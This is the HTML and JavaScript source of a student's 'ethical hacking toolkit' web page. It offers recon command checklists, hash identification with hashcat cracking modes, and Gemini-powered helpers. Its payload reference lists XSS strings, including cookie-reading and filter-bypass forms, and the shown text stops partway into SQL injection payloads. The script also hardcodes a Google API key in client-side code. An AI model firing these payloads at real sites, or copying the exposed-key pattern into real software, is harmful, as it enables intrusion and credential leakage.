<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>CyberKit — AI-Powered Ethical Hacking Toolkit</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;500;700;800&display=swap" rel="stylesheet" />
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #0a0c10;
    --bg2: #0f1117;
    --bg3: #151820;
    --border: rgba(255,255,255,0.07);
    --border2: rgba(255,255,255,0.12);
    --accent: #00e5ff;
    --accent2: #0077ff;
    --green: #00ff88;
    --red: #ff4444;
    --amber: #ffaa00;
    --text: #e8eaf0;
    --muted: #6b7280;
    --font-display: 'Syne', sans-serif;
    --font-mono: 'JetBrains Mono', monospace;
  }

  html { scroll-behavior: smooth; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--font-mono);
    font-size: 14px;
    line-height: 1.7;
    min-height: 100vh;
  }

  /* scanline overlay */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
    pointer-events: none;
    z-index: 9999;
  }

  /* NAV */
  nav {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 32px;
    border-bottom: 1px solid var(--border);
    background: rgba(10,12,16,0.95);
    backdrop-filter: blur(10px);
    position: sticky;
    top: 0;
    z-index: 100;
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 10px;
    font-family: var(--font-display);
    font-size: 20px;
    font-weight: 800;
    letter-spacing: -0.5px;
    color: var(--text);
    text-decoration: none;
  }

  .logo-shield {
    width: 32px;
    height: 32px;
    background: linear-gradient(135deg, var(--accent2), var(--accent));
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .logo-shield svg { width: 18px; height: 18px; fill: white; }

  .nav-links {
    display: flex;
    gap: 28px;
    list-style: none;
  }

  .nav-links a {
    color: var(--muted);
    text-decoration: none;
    font-size: 12px;
    letter-spacing: 0.05em;
    text-transform: uppercase;
    transition: color 0.2s;
  }

  .nav-links a:hover { color: var(--accent); }

  .nav-badge {
    font-size: 11px;
    background: rgba(0,229,255,0.1);
    color: var(--accent);
    border: 1px solid rgba(0,229,255,0.2);
    padding: 3px 10px;
    border-radius: 20px;
  }

  /* HERO */
  .hero {
    padding: 80px 32px 60px;
    max-width: 900px;
    margin: 0 auto;
    text-align: center;
    position: relative;
  }

  .hero-eyebrow {
    font-size: 11px;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: var(--accent);
    margin-bottom: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }

  .hero-eyebrow::before, .hero-eyebrow::after {
    content: '';
    width: 40px;
    height: 1px;
    background: var(--accent);
    opacity: 0.4;
  }

  .hero h1 {
    font-family: var(--font-display);
    font-size: clamp(36px, 6vw, 64px);
    font-weight: 800;
    line-height: 1.1;
    letter-spacing: -1px;
    margin-bottom: 20px;
    color: #fff;
  }

  .hero h1 span { color: var(--accent); }

  .hero p {
    font-size: 15px;
    color: var(--muted);
    max-width: 520px;
    margin: 0 auto 36px;
    line-height: 1.8;
  }

  .hero-btns {
    display: flex;
    gap: 12px;
    justify-content: center;
    flex-wrap: wrap;
  }

  .btn-primary {
    background: var(--accent2);
    color: #fff;
    border: none;
    padding: 12px 24px;
    border-radius: 8px;
    font-family: var(--font-mono);
    font-size: 13px;
    cursor: pointer;
    letter-spacing: 0.03em;
    transition: background 0.2s, transform 0.15s;
  }

  .btn-primary:hover { background: #005fcc; transform: translateY(-1px); }

  .btn-ghost {
    background: transparent;
    color: var(--accent);
    border: 1px solid rgba(0,229,255,0.3);
    padding: 12px 24px;
    border-radius: 8px;
    font-family: var(--font-mono);
    font-size: 13px;
    cursor: pointer;
    letter-spacing: 0.03em;
    transition: background 0.2s, transform 0.15s;
  }

  .btn-ghost:hover { background: rgba(0,229,255,0.07); transform: translateY(-1px); }

  /* STATS */
  .stats {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 1px;
    background: var(--border);
    border: 1px solid var(--border);
    border-radius: 12px;
    overflow: hidden;
    max-width: 700px;
    margin: 0 auto 60px;
  }

  .stat {
    background: var(--bg2);
    padding: 24px;
    text-align: center;
  }

  .stat-num {
    font-family: var(--font-display);
    font-size: 32px;
    font-weight: 800;
    color: var(--accent);
  }

  .stat-label {
    font-size: 11px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 0.08em;
    margin-top: 4px;
  }

  /* TOOLS SECTION */
  .section {
    max-width: 1000px;
    margin: 0 auto;
    padding: 0 32px 60px;
  }

  .section-header {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 24px;
  }

  .section-title {
    font-family: var(--font-display);
    font-size: 13px;
    font-weight: 700;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: var(--muted);
  }

  .section-line {
    flex: 1;
    height: 1px;
    background: var(--border);
  }

  .tools-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
    gap: 10px;
    margin-bottom: 24px;
  }

  .tool-card {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 18px;
    cursor: pointer;
    transition: border-color 0.2s, background 0.2s, transform 0.15s;
    position: relative;
    overflow: hidden;
  }

  .tool-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
    background: linear-gradient(90deg, var(--accent2), var(--accent));
    opacity: 0;
    transition: opacity 0.2s;
  }

  .tool-card:hover { border-color: var(--border2); transform: translateY(-2px); }
  .tool-card:hover::before { opacity: 1; }
  .tool-card.active { border-color: rgba(0,229,255,0.4); background: var(--bg3); }
  .tool-card.active::before { opacity: 1; }

  .tool-icon {
    font-size: 22px;
    margin-bottom: 10px;
    display: block;
  }

  .tool-name {
    font-family: var(--font-display);
    font-size: 14px;
    font-weight: 700;
    color: #fff;
    margin-bottom: 4px;
  }

  .tool-desc {
    font-size: 11px;
    color: var(--muted);
    line-height: 1.5;
  }

  /* PANEL */
  .tool-panel {
    background: var(--bg2);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 24px;
    display: none;
    animation: fadeIn 0.2s ease;
  }

  .tool-panel.visible { display: block; }

  @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }

  .panel-header {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 18px;
    padding-bottom: 14px;
    border-bottom: 1px solid var(--border);
  }

  .panel-title {
    font-family: var(--font-display);
    font-size: 16px;
    font-weight: 700;
    color: #fff;
  }

  .panel-badge {
    font-size: 10px;
    background: rgba(0,229,255,0.1);
    color: var(--accent);
    border: 1px solid rgba(0,229,255,0.2);
    padding: 2px 8px;
    border-radius: 20px;
  }

  .notice {
    font-size: 11px;
    color: var(--muted);
    background: rgba(255,170,0,0.06);
    border: 1px solid rgba(255,170,0,0.15);
    border-radius: 6px;
    padding: 8px 12px;
    margin-bottom: 14px;
  }

  .input-row {
    display: flex;
    gap: 8px;
    margin-bottom: 14px;
  }

  input[type="text"], input[type="password"] {
    flex: 1;
    height: 40px;
    padding: 0 14px;
    background: var(--bg3);
    border: 1px solid var(--border2);
    border-radius: 8px;
    font-family: var(--font-mono);
    font-size: 13px;
    color: var(--text);
    outline: none;
    transition: border-color 0.2s;
  }

  input:focus { border-color: rgba(0,229,255,0.4); }

  .run-btn {
    height: 40px;
    padding: 0 20px;
    background: var(--accent2);
    color: #fff;
    border: none;
    border-radius: 8px;
    font-family: var(--font-mono);
    font-size: 13px;
    cursor: pointer;
    white-space: nowrap;
    transition: background 0.2s;
  }

  .run-btn:hover { background: #005fcc; }

  .result-label {
    font-size: 11px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 0.08em;
    margin-bottom: 8px;
  }

  .result-box {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
    font-size: 12px;
    line-height: 1.8;
    color: var(--text);
    white-space: pre-wrap;
    min-height: 80px;
    font-family: var(--font-mono);
  }

  .result-box.green { color: var(--green); }
  .result-box.loading { color: var(--accent); animation: pulse 1.5s infinite; }

  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }

  /* PASSWORD */
  .pw-strength-track {
    height: 4px;
    background: var(--border);
    border-radius: 2px;
    margin: 10px 0 14px;
    overflow: hidden;
  }

  .pw-strength-fill {
    height: 100%;
    border-radius: 2px;
    transition: width 0.4s, background 0.4s;
    width: 0%;
  }

  .pw-meta {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 8px;
    margin-bottom: 14px;
  }

  .pw-check {
    font-size: 11px;
    padding: 6px 10px;
    border-radius: 6px;
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--muted);
    text-align: center;
    transition: all 0.2s;
  }

  .pw-check.pass { border-color: rgba(0,255,136,0.3); color: var(--green); background: rgba(0,255,136,0.06); }
  .pw-check.fail { border-color: rgba(255,68,68,0.3); color: var(--red); background: rgba(255,68,68,0.06); }

  /* CHAT */
  .chat-area {
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 16px;
    min-height: 220px;
    max-height: 340px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin-bottom: 12px;
  }

  .chat-area::-webkit-scrollbar { width: 4px; }
  .chat-area::-webkit-scrollbar-track { background: transparent; }
  .chat-area::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }

  .msg {
    padding: 10px 14px;
    border-radius: 8px;
    font-size: 13px;
    line-height: 1.7;
    max-width: 88%;
  }

  .msg.user {
    background: rgba(0,119,255,0.12);
    border: 1px solid rgba(0,119,255,0.2);
    color: #7bb8ff;
    align-self: flex-end;
  }

  .msg.ai {
    background: var(--bg2);
    border: 1px solid var(--border);
    color: var(--text);
    align-self: flex-start;
  }

  .msg.loading { color: var(--muted); font-style: italic; border-style: dashed; }

  /* PAYLOAD TABS */
  .tab-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }

  .tab-btn {
    padding: 7px 14px;
    background: var(--bg3);
    border: 1px solid var(--border);
    border-radius: 6px;
    font-family: var(--font-mono);
    font-size: 12px;
    color: var(--muted);
    cursor: pointer;
    transition: all 0.2s;
  }

  .tab-btn:hover, .tab-btn.active { border-color: rgba(0,229,255,0.4); color: var(--accent); background: rgba(0,229,255,0.06); }

  /* DISCLAIMER BANNER */
  .disclaimer {
    max-width: 1000px;
    margin: 0 auto 40px;
    padding: 0 32px;
  }

  .disclaimer-inner {
    background: rgba(255,68,68,0.04);
    border: 1px solid rgba(255,68,68,0.15);
    border-radius: 10px;
    padding: 14px 18px;
    font-size: 12px;
    color: var(--muted);
    display: flex;
    gap: 10px;
    align-items: flex-start;
  }

  .disclaimer-inner span { color: var(--red); font-size: 14px; flex-shrink: 0; }

  /* FOOTER */
  footer {
    border-top: 1px solid var(--border);
    padding: 24px 32px;
    text-align: center;
    font-size: 11px;
    color: var(--muted);
    letter-spacing: 0.05em;
  }

  footer a { color: var(--accent); text-decoration: none; }
</style>
</head>
<body>

<nav>
  <a class="logo" href="#">
    <div class="logo-shield">
      <svg viewBox="0 0 24 24"><path d="M12 2L4 6v6c0 5.5 3.8 10.7 8 12 4.2-1.3 8-6.5 8-12V6l-8-4z"/></svg>
    </div>
    CyberKit
  </a>
  <ul class="nav-links">
    <li><a href="#tools">Tools</a></li>
    <li><a href="#about">About</a></li>
  </ul>
  <span class="nav-badge">v1.0 Beta</span>
</nav>

<section class="hero">
  <div class="hero-eyebrow">AI-Powered Ethical Hacking Toolkit</div>
  <h1>Your personal<br /><span>cybersecurity</span> arsenal</h1>
  <p>A suite of AI-powered tools for ethical hackers, security analysts, and students. Built for authorized use only.</p>
  <div class="hero-btns">
    <button class="btn-primary" onclick="document.getElementById('tools').scrollIntoView({behavior:'smooth'})">↓ Open toolkit</button>
    <button class="btn-ghost" onclick="openTool('ai')">Ask AI assistant</button>
  </div>
</section>

<div class="section">
  <div class="stats">
    <div class="stat"><div class="stat-num">8</div><div class="stat-label">Tools</div></div>
    <div class="stat"><div class="stat-num">AI</div><div class="stat-label">Powered</div></div>
    <div class="stat"><div class="stat-num">100%</div><div class="stat-label">Ethical</div></div>
  </div>
</div>

<div class="disclaimer">
  <div class="disclaimer-inner">
    <span>⚠</span>
    <div>All tools are intended for <strong>authorized</strong> security testing, educational purposes, and CTF challenges only. Never use these tools against systems you do not own or have explicit written permission to test. Unauthorized access is illegal.</div>
  </div>
</div>

<div class="section" id="tools">
  <div class="section-header">
    <span class="section-title">Tools</span>
    <div class="section-line"></div>
  </div>

  <div class="tools-grid">
    <div class="tool-card" id="card-recon" onclick="openTool('recon')">
      <span class="tool-icon">🔍</span>
      <div class="tool-name">Recon helper</div>
      <div class="tool-desc">Domain & IP reconnaissance checklist</div>
    </div>
    <div class="tool-card" id="card-password" onclick="openTool('password')">
      <span class="tool-icon">🔐</span>
      <div class="tool-name">Password analyzer</div>
      <div class="tool-desc">Real-time strength & weakness check</div>
    </div>
    <div class="tool-card" id="card-hash" onclick="openTool('hash')">
      <span class="tool-icon">🔑</span>
      <div class="tool-name">Hash identifier</div>
      <div class="tool-desc">Identify MD5, SHA, bcrypt & more</div>
    </div>
    <div class="tool-card" id="card-vuln" onclick="openTool('vuln')">
      <span class="tool-icon">🛡️</span>
      <div class="tool-name">Vuln notes</div>
      <div class="tool-desc">AI-generated pentest report notes</div>
    </div>
    <div class="tool-card" id="card-payload" onclick="openTool('payload')">
      <span class="tool-icon">📋</span>
      <div class="tool-name">Payload reference</div>
      <div class="tool-desc">CTF & lab payload quick-reference</div>
    </div>
    <div class="tool-card" id="card-cve" onclick="openTool('cve')">
      <span class="tool-icon">🔎</span>
      <div class="tool-name">CVE lookup</div>
      <div class="tool-desc">Search & explain known vulnerabilities</div>
    </div>
    <div class="tool-card" id="card-ai" onclick="openTool('ai')">
      <span class="tool-icon">🤖</span>
      <div class="tool-name">AI assistant</div>
      <div class="tool-desc">Ask any cybersecurity question</div>
    </div>
    <div class="tool-card" id="card-phishing" onclick="openTool('phishing')">
      <span class="tool-icon">🎣</span>
      <div class="tool-name">Phishing detector</div>
      <div class="tool-desc">AI detects phishing URLs, emails & scams</div>
    </div>
  </div>

  <!-- RECON PANEL -->
  <div class="tool-panel" id="panel-recon">
    <div class="panel-header">
      <span>🔍</span>
      <span class="panel-title">Recon helper</span>
      <span class="panel-badge">Passive recon</span>
    </div>
    <div class="notice">⚠ Only use on domains you own or have written permission to test.</div>
    <div class="input-row">
      <input type="text" id="recon-input" placeholder="Enter target domain (e.g. example.com)" />
      <button class="run-btn" onclick="runRecon()">Generate checklist</button>
    </div>
    <div class="result-label">Recon checklist & commands</div>
    <div class="result-box green" id="recon-result">Enter a domain above to generate your recon checklist.</div>
  </div>

  <!-- PASSWORD PANEL -->
  <div class="tool-panel" id="panel-password">
    <div class="panel-header">
      <span>🔐</span>
      <span class="panel-title">Password strength analyzer</span>
    </div>
    <div class="input-row">
      <input type="text" id="pw-input" placeholder="Type a password to analyze..." oninput="analyzePw()" />
    </div>
    <div class="pw-strength-track"><div class="pw-strength-fill" id="pw-bar"></div></div>
    <div class="pw-meta">
      <div class="pw-check" id="chk-len">Length</div>
      <div class="pw-check" id="chk-upper">Uppercase</div>
      <div class="pw-check" id="chk-num">Numbers</div>
      <div class="pw-check" id="chk-sym">Symbols</div>
    </div>
    <div class="result-label">Analysis</div>
    <div class="result-box" id="pw-result">Type a password above to analyze it.</div>
  </div>

  <!-- HASH PANEL -->
  <div class="tool-panel" id="panel-hash">
    <div class="panel-header">
      <span>🔑</span>
      <span class="panel-title">Hash identifier</span>
    </div>
    <div class="input-row">
      <input type="text" id="hash-input" placeholder="Paste a hash string here..." />
      <button class="run-btn" onclick="identifyHash()">Identify</button>
    </div>
    <div class="result-label">Hash type & details</div>
    <div class="result-box green" id="hash-result">Paste a hash above to identify its type.</div>
  </div>

  <!-- VULN NOTES PANEL -->
  <div class="tool-panel" id="panel-vuln">
    <div class="panel-header">
      <span>🛡️</span>
      <span class="panel-title">Vulnerability notes generator</span>
      <span class="panel-badge">AI powered</span>
    </div>
    <p style="font-size:12px;color:var(--muted);margin-bottom:12px;">Describe a vulnerability and AI will write professional pentest report notes.</p>
    <div class="input-row">
      <input type="text" id="vuln-input" placeholder="e.g. SQL injection found on login form" />
      <button class="run-btn" onclick="genVulnNotes()">Generate</button>
    </div>
    <div class="result-label">Report notes</div>
    <div class="result-box" id="vuln-result">Describe a vulnerability above to generate report notes.</div>
  </div>

  <!-- PAYLOAD PANEL -->
  <div class="tool-panel" id="panel-payload">
    <div class="panel-header">
      <span>📋</span>
      <span class="panel-title">Payload reference</span>
    </div>
    <div class="notice">⚠ For authorized CTF labs and practice environments only (DVWA, HackTheBox, TryHackMe).</div>
    <div class="tab-row">
      <button class="tab-btn" onclick="showPayload('xss', this)">XSS</button>
      <button class="tab-btn" onclick="showPayload('sqli', this)">SQLi</button>
      <button class="tab-btn" onclick="showPayload('lfi', this)">LFI</button>
      <button class="tab-btn" onclick="showPayload('cmd', this)">Command injection</button>
      <button class="tab-btn" onclick="showPayload('xxe', this)">XXE</button>
    </div>
    <div class="result-box green" id="payload-result">Select a payload category above.</div>
  </div>

  <!-- CVE PANEL -->
  <div class="tool-panel" id="panel-cve">
    <div class="panel-header">
      <span>🔎</span>
      <span class="panel-title">CVE lookup & explainer</span>
      <span class="panel-badge">AI powered</span>
    </div>
    <div class="input-row">
      <input type="text" id="cve-input" placeholder="e.g. CVE-2021-44228 or Log4Shell" />
      <button class="run-btn" onclick="lookupCVE()">Look up</button>
    </div>
    <div class="result-label">Vulnerability explanation</div>
    <div class="result-box" id="cve-result">Enter a CVE ID or vulnerability name above.</div>
  </div>

  <!-- AI ASSISTANT PANEL -->
  <div class="tool-panel" id="panel-ai">
    <div class="panel-header">
      <span>🤖</span>
      <span class="panel-title">AI cybersecurity assistant</span>
      <span class="panel-badge">Gemini AI</span>
    </div>
    <div class="chat-area" id="chat-area">
      <div class="msg ai">Hi! I'm your cybersecurity assistant. Ask me anything about ethical hacking, penetration testing, CTFs, tools, or career advice in security.</div>
    </div>
    <div class="input-row">
      <input type="text" id="ai-input" placeholder="Ask a cybersecurity question..." onkeydown="if(event.key==='Enter')sendChat()" />
      <button class="run-btn" onclick="sendChat()">Send →</button>
    </div>
  </div>

  <!-- PHISHING DETECTOR PANEL -->
  <div class="tool-panel" id="panel-phishing">
    <div class="panel-header">
      <span>🎣</span>
      <span class="panel-title">Phishing &amp; scam detector</span>
      <span class="panel-badge">AI powered</span>
    </div>
    <p style="font-size:12px;color:var(--muted);margin-bottom:14px;">Paste a suspicious URL, email content, or SMS message. AI will analyze it for phishing indicators, scam patterns, and social engineering tactics.</p>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
      <button class="tab-btn active" id="ptab-url" onclick="switchPhishTab('url',this)">🔗 URL / Link</button>
      <button class="tab-btn" id="ptab-email" onclick="switchPhishTab('email',this)">📧 Email content</button>
      <button class="tab-btn" id="ptab-sms" onclick="switchPhishTab('sms',this)">💬 SMS / WhatsApp</button>
    </div>
    <div id="phish-hint" style="font-size:11px;color:var(--muted);margin-bottom:8px;">Paste a suspicious URL or domain to check</div>
    <div class="input-row">
      <input type="text" id="phish-input" placeholder="Paste suspicious URL here..." />
      <button class="run-btn" onclick="runPhishDetect()">Analyze</button>
    </div>
    <div id="risk-meter" style="display:none;margin-bottom:14px;">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
        <span style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:0.08em;">Risk level</span>
        <span id="risk-label" style="font-size:13px;font-weight:700;"></span>
      </div>
      <div style="height:6px;background:var(--border);border-radius:3px;overflow:hidden;">
        <div id="risk-bar" style="height:100%;border-radius:3px;transition:width 0.5s,background 0.5s;width:0%;"></div>
      </div>
    </div>
    <div class="result-label">Detection report</div>
    <div class="result-box" id="phish-result">Paste a suspicious URL, email, or message above to analyze it.</div>
    <div style="margin-top:14px;padding:10px 14px;background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.12);border-radius:8px;font-size:11px;color:var(--muted);">
      💡 <strong style="color:var(--green);">Quick tips:</strong> Hover over links before clicking &nbsp;·&nbsp; Check sender email domains carefully &nbsp;·&nbsp; Legitimate companies never ask for passwords via email &nbsp;·&nbsp; Urgency = red flag
    </div>
  </div>
</div>

<div id="about" style="max-width:1000px;margin:0 auto;padding:0 32px 60px;">
  <div class="section-header">
    <span class="section-title">About</span>
    <div class="section-line"></div>
  </div>
  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;">
    <p style="font-size:13px;color:var(--muted);line-height:1.9;">
      CyberKit is a personal AI-powered toolkit built by a cybersecurity student focused on ethical hacking and security analysis.
      All tools are designed for authorized testing, learning, and CTF challenges only.
      The AI features are powered by Claude AI (Anthropic).
      <br/><br/>
      This project is part of a portfolio demonstrating practical cybersecurity and web development skills.
    </p>
  </div>
</div>

<footer>
  CyberKit &nbsp;|&nbsp; For authorized and educational use only &nbsp;|&nbsp; Built by a cybersecurity student
  <br/><br/>
  <span style="font-size:10px;">AI powered by Google Gemini (Free)</span>
</footer>

<script>
  // ── Google Gemini API (Free) ──
  const API_KEY = 'AIzaSyCjo_zuOJo4LrOcRzIzIumNwzWbdq1R9NI';
  const GEMINI_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`;

  async function askGemini(prompt) {
    const res = await fetch(GEMINI_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        contents: [{ parts: [{ text: prompt }] }],
        generationConfig: { temperature: 0.7, maxOutputTokens: 1000 }
      })
    });
    if (!res.ok) {
      const err = await res.json();
      throw new Error(err?.error?.message || 'API error ' + res.status);
    }
    const data = await res.json();
    return data?.candidates?.[0]?.content?.parts?.[0]?.text || 'Could not get a response.';
  }

  function openTool(id) {
    document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('visible'));
    document.querySelectorAll('.tool-card').forEach(c => c.classList.remove('active'));
    const panel = document.getElementById('panel-' + id);
    const card = document.getElementById('card-' + id);
    if (panel) { panel.classList.add('visible'); setTimeout(() => panel.scrollIntoView({behavior:'smooth', block:'nearest'}), 50); }
    if (card) card.classList.add('active');
  }

  function runRecon() {
    const domain = document.getElementById('recon-input').value.trim();
    if (!domain) return;
    document.getElementById('recon-result').textContent =
`Recon checklist for: ${domain}
${'─'.repeat(40)}

[1] WHOIS lookup
    Command : whois ${domain}
    Online  : https://who.is / https://whois.domaintools.com

[2] DNS enumeration
    Commands: nslookup ${domain}
              dig ${domain} ANY
              dig ${domain} MX
    Tool    : dnsx, dnsrecon

[3] Subdomain discovery
    Commands: subfinder -d ${domain} -o subs.txt
              amass enum -d ${domain}
              assetfinder ${domain}
    Wordlist: /usr/share/seclists/Discovery/DNS/

[4] Port scanning (authorized targets only)
    Commands: nmap -sV -sC ${domain}
              nmap -p- --min-rate 3000 ${domain}
    Tool    : masscan, rustscan

[5] Technology fingerprinting
    Tools   : Wappalyzer (browser ext), whatweb
    Command : whatweb ${domain}

[6] Directory & file discovery
    Commands: gobuster dir -u http://${domain} -w /usr/share/wordlists/dirb/common.txt
              ffuf -u http://${domain}/FUZZ -w wordlist.txt
    Tool    : dirsearch, feroxbuster

[7] SSL/TLS analysis
    Tool    : testssl.sh, ssllabs.com
    Command : testssl.sh ${domain}

[8] Google dorking
    Queries : site:${domain} filetype:pdf
              site:${domain} inurl:admin
              site:${domain} intitle:login

⚠  Always verify you have written authorization before scanning.`;
  }

  function analyzePw() {
    const pw = document.getElementById('pw-input').value;
    const bar = document.getElementById('pw-bar');
    const result = document.getElementById('pw-result');
    const checks = { len: false, upper: false, num: false, sym: false };
    if (!pw) {
      bar.style.width = '0%';
      result.textContent = 'Type a password above to analyze it.';
      ['len','upper','num','sym'].forEach(k => { document.getElementById('chk-'+k).className = 'pw-check'; });
      return;
    }
    let score = 0;
    const issues = []; const tips = [];
    if (pw.length >= 8) { score += 20; checks.len = true; } else issues.push('Too short — minimum 8 characters');
    if (pw.length >= 12) score += 10;
    if (pw.length >= 16) score += 10;
    if (/[A-Z]/.test(pw)) { score += 15; checks.upper = true; } else tips.push('Add uppercase letters (A-Z)');
    if (/[a-z]/.test(pw)) score += 10; else tips.push('Add lowercase letters (a-z)');
    if (/[0-9]/.test(pw)) { score += 15; checks.num = true; } else tips.push('Add numbers (0-9)');
    if (/[^A-Za-z0-9]/.test(pw)) { score += 15; checks.sym = true; } else tips.push('Add special characters (!@#$%^&*)');
    const common = ['password','123456','qwerty','abc123','letmein','admin','welcome','monkey','dragon','master'];
    if (common.includes(pw.toLowerCase())) { score = 5; issues.push('This is a commonly used password — extremely vulnerable'); }
    score = Math.min(100, score);
    const colors = [[20,'#ff4444'],[40,'#ff8800'],[60,'#ffaa00'],[80,'#88cc00'],[100,'#00ff88']];
    const labels = [[20,'Very weak'],[40,'Weak'],[60,'Moderate'],[80,'Strong'],[100,'Very strong']];
    const bracket = colors.find(b => score <= b[0]);
    const labelBracket = labels.find(b => score <= b[0]);
    bar.style.width = score + '%';
    bar.style.background = bracket[1];
    ['len','upper','num','sym'].forEach(k => {
      const el = document.getElementById('chk-'+k);
      el.className = 'pw-check ' + (checks[k] ? 'pass' : 'fail');
    });
    let txt = `Strength : ${labelBracket[1]} (${score}/100)\nLength   : ${pw.length} characters\n`;
    if (issues.length) txt += `\nIssues:\n${issues.map(i => '  ✗ ' + i).join('\n')}`;
    if (tips.length) txt += `\nTips:\n${tips.map(t => '  → ' + t).join('\n')}`;
    if (!issues.length && !tips.length) txt += '\n✓ This password meets all strength criteria.';
    result.textContent = txt;
  }

  function identifyHash() {
    const h = document.getElementById('hash-input').value.trim();
    const result = document.getElementById('hash-result');
    if (!h) return;
    const len = h.length;
    const hex = /^[a-fA-F0-9]+$/.test(h);
    let type = 'Unknown hash type';
    if (hex && len === 32) type = `Hash type : MD5 (128-bit)\nAlgorithm : MD5\nStatus    : Broken — vulnerable to collision attacks\nCracking  : hashcat -m 0 hash.txt wordlist.txt\n           john --format=raw-md5 hash.txt\nNote      : Do not use for password storage`;
    else if (hex && len === 40) type = `Hash type : SHA-1 (160-bit)\nAlgorithm : SHA-1\nStatus    : Deprecated — collision attacks proven\nCracking  : hashcat -m 100 hash.txt wordlist.txt\n           john --format=raw-sha1 hash.txt`;
    else if (hex && len === 64) type = `Hash type : SHA-256 (256-bit)\nAlgorithm : SHA-2 family\nStatus    : Secure — widely used\nCracking  : hashcat -m 1400 hash.txt wordlist.txt\nUsed for  : TLS/SSL, file integrity, modern apps`;
    else if (hex && len === 128) type = `Hash type : SHA-512 (512-bit)\nAlgorithm : SHA-2 family\nStatus    : Very secure\nCracking  : hashcat -m 1700 hash.txt wordlist.txt`;
    else if (h.startsWith('$2a$') || h.startsWith('$2b$') || h.startsWith('$2y$')) type = `Hash type : bcrypt\nAlgorithm : Blowfish-based adaptive hash\nStatus    : Secure — designed to be slow\nCracking  : hashcat -m 3200 hash.txt wordlist.txt\nNote      : Cost factor makes brute-force very expensive`;
    else if (h.startsWith('$1$')) type = `Hash type : MD5crypt (Unix)\nCracking  : hashcat -m 500`;
    else if (h.startsWith('$6$')) type = `Hash type : SHA-512crypt (Unix shadow)\nCracking  : hashcat -m 1800`;
    else if (h.startsWith('$5$')) type = `Hash type : SHA-256crypt (Unix shadow)\nCracking  : hashcat -m 7400`;
    else if (h.startsWith('$P$') || h.startsWith('$H$')) type = `Hash type : phpass (WordPress/phpBB)\nCracking  : hashcat -m 400`;
    else if (/^[a-fA-F0-9]{56}$/.test(h)) type = `Hash type : SHA-224 (224-bit)\nCracking  : hashcat -m 1300`;
    else if (/^[a-fA-F0-9]{96}$/.test(h)) type = `Hash type : SHA-384 (384-bit)\nCracking  : hashcat -m 10800`;
    result.textContent = type;
  }

  async function genVulnNotes() {
    const vuln = document.getElementById('vuln-input').value.trim();
    const result = document.getElementById('vuln-result');
    if (!vuln) return;
    result.className = 'result-box loading';
    result.textContent = 'Generating professional report notes...';
    try {
      const text = await askGemini(`You are a professional penetration tester. Write structured pentest report notes for this finding: "${vuln}". Format: Vulnerability Name, Severity (Critical/High/Medium/Low with justification), CVSS Score estimate, Description, Affected Component, Proof of Concept (generic steps), Impact, Remediation. Plain text only, no markdown symbols.`);
      result.className = 'result-box';
      result.textContent = text;
    } catch(e) {
      result.className = 'result-box';
      result.textContent = 'Error: Could not connect to AI. Check your API key.';
    }
  }

  function showPayload(type, btn) {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    const payloads = {
      xss: `XSS (Cross-Site Scripting) — Lab payloads
${'─'.repeat(38)}

Basic script tag:
  <script>alert(1)<\/script>
  <script>alert(document.cookie)<\/script>

Event handlers:
  <img src=x onerror=alert(1)>
  <body onload=alert(1)>
  <svg onload=alert(1)>
  <input autofocus onfocus=alert(1)>

Attribute injection:
  " onmouseover="alert(1)
  javascript:alert(1)

Filter bypass:
  <ScRiPt>alert(1)<\/ScRiPt>
  <img src=x onerror="&#97;lert(1)">
  <svg><script>alert&#40;1&#41;<\/script>

DOM-based:
  #"><img src=x onerror=alert(1)>

⚠ Use only in authorized labs: DVWA, XSS-Game, HackTheBox, TryHackMe`,

      sqli: `SQL Injection — Lab payloads
${'─'.repeat(38)}

Boolean-based:
  ' OR '1'='1
  ' OR 1=1 --
